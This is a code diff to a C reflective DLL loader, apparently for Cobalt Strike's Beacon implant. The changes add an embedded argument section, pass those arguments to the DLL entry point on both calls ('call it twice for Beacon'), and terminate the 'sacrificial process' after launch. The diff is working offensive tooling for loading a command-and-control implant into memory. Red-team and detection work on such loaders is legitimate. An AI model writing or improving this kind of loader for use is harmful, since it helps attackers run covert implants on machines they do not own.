@@ -2,10 +2,12 @@
 #include "tcg.h"
 
 DECLSPEC_IMPORT LPVOID WINAPI KERNEL32$VirtualAlloc ( LPVOID, SIZE_T, DWORD, DWORD );
-
+WINBASEAPI VOID WINAPI KERNEL32$ExitProcess(UINT uExitCode);
 
 /* Pointer to DLL resource */
 char _DLL_ [0] __attribute__ ( ( section ( "dll" ) ) );
+char _DLLARGS_ [0] __attribute__ ( ( section ( "dll_args" ) ) );
+
 
 /* Macro to get Pointer to resource */
 #define GETRESOURCE(x) ( char * ) &x
@@ -36,9 +38,15 @@ void go ( void * loader_arguments )
 	/* get its entry point */
 	DLLMAIN_FUNC entry_point = EntryPoint ( &dll_data, dll_dst );
 
+	/* Pointer to DLL arguments */
+	char * dll_arguments = GETRESOURCE ( _DLLARGS_ );
+
 	/* call it twice for Beacon */
-	entry_point ( ( HINSTANCE ) dll_dst, DLL_PROCESS_ATTACH, NULL );
-	entry_point ( ( HINSTANCE ) ( char * ) go, 0x4, loader_arguments );
+	entry_point ( ( HINSTANCE ) dll_dst, DLL_PROCESS_ATTACH, dll_arguments );
+	entry_point ( ( HINSTANCE ) ( char * ) go, 0x4, dll_arguments );
+
+	// Important! Exit sacrificial process
+    KERNEL32$ExitProcess(0);
 }
 
 FARPROC resolve ( DWORD mod_hash, DWORD func_hash )
